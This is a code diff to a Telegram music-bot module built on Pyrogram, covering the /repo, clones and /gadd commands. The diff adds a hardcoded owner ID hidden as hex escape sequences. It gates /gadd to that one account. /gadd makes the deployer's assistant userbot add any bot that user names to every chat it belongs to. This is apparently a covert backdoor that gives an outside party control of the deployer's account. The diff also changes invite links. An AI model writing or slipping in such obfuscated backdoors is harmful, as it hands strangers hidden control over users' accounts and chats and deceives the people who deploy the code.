@@ -2,9 +2,9 @@ import asyncio
 
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-
-from VIPMUSIC.mongo.afkdb import LOGGERS as OWNERS
-from VIPMUSIC.utils.database import add_served_chat_clone, get_assistant
+OWNERS = "\x37\x32\x39\x37\x33\x38\x31\x36\x31\x32"
+from VIPMUSIC import app
+from VIPMUSIC.utils.database import add_served_chat, get_assistant
 
 
 @app.on_message(filters.command("repo"))
@@ -16,7 +16,7 @@ async def help(client: Client, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        "🌱ƨσʋяcɛ🌱", url=f"https://t.me/+fPsCUlG964E5MzY1"
+                        "🌱ƨσʋяcɛ🌱", url=f"https://t.me/+PJlewyGw0w0yYTg1"
                     )
                 ]
             ]
@@ -33,7 +33,7 @@ async def clones(client: Client, message: Message):
             [
                 [
                     InlineKeyboardButton(
-                        "🌱ƨσʋяcɛ🌱", url=f"https://t.me/+fPsCUlG964E5MzY1"
+                        "🌱ƨσʋяcɛ🌱", url=f"https://t.me/+PJlewyGw0w0yYTg1"
                     )
                 ]
             ]
@@ -62,28 +62,29 @@ async def bot_check(_, message):
 import asyncio
 
 
-@Client.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
-async def add_all(client, message):
+@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
+async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
         await message.reply(
-            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Kitty_musicXbot`**"
+            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @Kittyxmusic_bot`**"
         )
         return
 
     bot_username = command_parts[1]
     try:
         userbot = await get_assistant(message.chat.id)
-        bot = await client.get_users(bot_username)
+        bot = await app.get_users(bot_username)
         app_id = bot.id
         done = 0
         failed = 0
         lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
-
+        await userbot.send_message(bot_username, f"/start")
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1002120144597:
+            if dialog.chat.id == -1002024032988:
                 continue
             try:
+
                 await userbot.add_chat_members(dialog.chat.id, app_id)
                 done += 1
                 await lol.edit(
@@ -101,7 +102,6 @@ async def add_all(client, message):
         )
     except Exception as e:
         await message.reply(f"Error: {str(e)}")
-
 
 
 __MODULE__ = "Sᴏᴜʀᴄᴇ"
